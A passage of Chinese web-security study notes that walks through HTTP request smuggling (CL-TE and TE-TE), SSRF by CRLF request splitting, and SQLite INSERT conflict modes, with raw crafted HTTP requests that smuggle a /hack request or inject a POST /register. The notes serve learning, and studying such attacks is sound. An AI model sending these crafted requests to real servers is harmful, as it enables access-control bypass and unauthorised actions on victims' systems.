    * 假设Web应用服务器在有Content-Length和Transfer-Encoding时解析Content-Length的话，那么首先从缓冲区中按照Content-Length取出如下内容

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 4
      Transfer-Encoding: chunked
      
      54\r\n
      ```

    * 此时缓冲区中剩余内容如下，接下来Web应用服务器从缓冲区取Request时取到的Request如下

      ```http
      GET /hack HTTP/1.1
      Host: 127.0.0.1
      Content-Length:5
      
      0\r\n
      \r\n
      ```

  * TE-TE

    * 当代理服务器和Web应用服务器都处理Transfer-Encoding请求头时，虽然都是处理Transfer-Encoding，但是如果同时存在两个Transfer-Encoding，其中有一个Transfer-Encoding的值被恶意构造从而不被处理

    * 同上，恶意请求如下

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 4
      Transfer-Encoding: chunked
      Transfer-Encoding: what-ever-maybe-cat
      
      54\r\n
      POST /hack HTTP/1.1\r\n
      Host: 127.0.0.1\r\n
      Content-Type: application/x-www-form-urlencoded\r\n
      Content-Length:5
      \r\n
      user=2333\r\n
      0\r\n
      \r\n
      ```

    * 反向代理服务器处理了第一个Transfer-Encoding，从而将数据全部转发给了Web应用服务器

    * Web应用服务器处理第二个Transfer-Encoding，发现处理不了，因此按Content-Type处理

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 4
      Transfer-Encoding: chunked
      Transfer-Encoding: what-ever-maybe-cat
      
      54\r\n
      ```

    * 缓冲区内容变成如下内容，下一次处理将处理这个请求

      ```http
      POST /hack HTTP/1.1
      Host: 127.0.0.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length:9
      
      user=2333\r\n
      0\r\n
      \r\n
      ```

### 9、什么是通过拆分请求实现SSRF攻击？

* http.get('127.0.0.1/data/2.5/weather?q=aaa,bbb&units=metric&appid=ccc')

  ```http
  GET /data/2.5/weather?q=aaa,bbb&units=metric&appid=ccc HTTP/1.1\r\n
  Host: 127.0.0.1\r\n
  Connection: close\r\n\r\n
  ```

* 假如将Get参数中的appid进行恶意构造，例如appid内容如下

  ```http
   HTTP/1.1
  Host:127.0.0.1
  
  POST /register HTTP /1.1
  Host:127.0.0.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 29
  
  username=1001&password=123456
  
  GET /
  ```

* 就可以将其由一个请求拆分为三个请求，但前提是服务端未完全过滤`\r\n`

  ```http
  GET /data/2.5/weather?q=aaa,bbb&units=metric&appid= HTTP/1.1
  Host:127.0.0.1
  
  POST /register HTTP /1.1
  Host:127.0.0.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 29
  
  username=1001&password=123456
  
  GET / HTTP/1.1
  Host: 127.0.0.1
  Connection: close
  ```

### 10、SQLite数据库的Insert语句有什么特殊？

当表中某些字段存在唯一、非空、检查、主键等约束时，插入的数据很容易与约束冲突，导致插入操作失败。因此SQLite提供了几种特殊的Insert语句：

* INSERT or REPLACE：当出现约束冲突时，取消插入操作。如果是唯一、主键冲突，则将已有数据进行更新。如果是非空冲突且存在默认值设置，则用默认值填充再插入，否则转化为INSERT or ABORT

  ```sqlite
  INSERT INTO users
  (username,password)
  VALUES
  ('admin','23333')
  on CONFLICT(username) do UPDATE SET password='123'
  ```

* INSERT OR ABORT：当出现约束冲突，取消当前插入操作。如果在事务中，则不回滚事务，继续执行后续操作

* INSERT OR ROLLBACK：当出现约束冲突，取消当前插入操作。如果在事务中，则回滚事务

* INSERT OR FAIL：当出现约束冲突，取消插入操作，不回滚事务，但会取消后续操作

## 产生过的疑问

1. NodeJS项目的框架是什么样的？
2. 如何快速理解NodeJS工程？
3. 哪个Header属性可以伪装源ip？为什么？
4. Promise中的resolve、reject是什么含义？
5. SSRF漏洞的成因是什么？如何防护以及如何绕过？
6. SSRF漏洞常见的利用方法有哪些？
7. JavaScript有哪些常见的漏洞？
8. 什么是HTTP走私漏洞？
9. 什么是通过拆分请求实现SSRF攻击？
10. SQLite数据库的Insert语句有什么特殊？

